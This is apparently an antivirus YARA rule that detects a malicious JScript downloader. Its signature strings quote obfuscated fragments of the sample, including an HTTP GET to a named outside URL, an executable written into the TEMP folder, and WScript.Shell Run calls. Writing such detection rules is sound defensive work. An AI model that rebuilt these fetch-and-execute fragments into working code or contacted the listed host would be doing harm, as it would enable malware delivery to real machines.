rule sig_20160329_0b1a1e5b3dd540736b2c2bcd2c7d4b4a {
  meta:
    description = "datamaliciousorder - file 20160329_0b1a1e5b3dd540736b2c2bcd2c7d4b4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3789f2543a1c96ca35e8e9a27fbde7d0ce1327b98c4763b9a9e14d47136de48c"

  strings:
    $s1  = "Ah[bM](\"GET\", \"http://caferacerpneus.com.br/lw2osd\", false);" fullword ascii
    $s2  = "function Xu() {return os[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bD4FtHZEKvIEnhLc.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[o](Is() * 11); if (Ah[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function xE(Z, J){v = v * 1; return Z - J;};" fullword ascii
    $s5  = "var os = function i() {return WScript[T](\"WScript.Shell\");}(), O = 11;" fullword ascii
    $s6  = "function AK(){return \"\" + lp;};" fullword ascii
    $s7  = "function Q(T1){os[\"Run\"](T1, v, v);};" fullword ascii
    $s8  = "function qF() {return ((wx == true) && (wx == K)) ? 1 : v;};" fullword ascii
    $s9  = " while (dI){" fullword ascii
    $s10 = "function f()" fullword ascii
    $s11 = "function Is(){return 22;};" fullword ascii
    $s12 = "function KW(){return T;};" fullword ascii
    $s13 = "return xE(l0, UZ);" fullword ascii
    $s14 = "var r = new this[\"Date\"]();" fullword ascii
    $s15 = "function l(Q0) {var a = (1, 2, 3, 4, 5, Q0); return a;};" fullword ascii
    $s16 = "var wx = false;" fullword ascii
    $s17 = "wx = true; " fullword ascii
    $s18 = "var do0 = false;" fullword ascii
    $s19 = "K = true; " fullword ascii
    $s20 = "var K = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}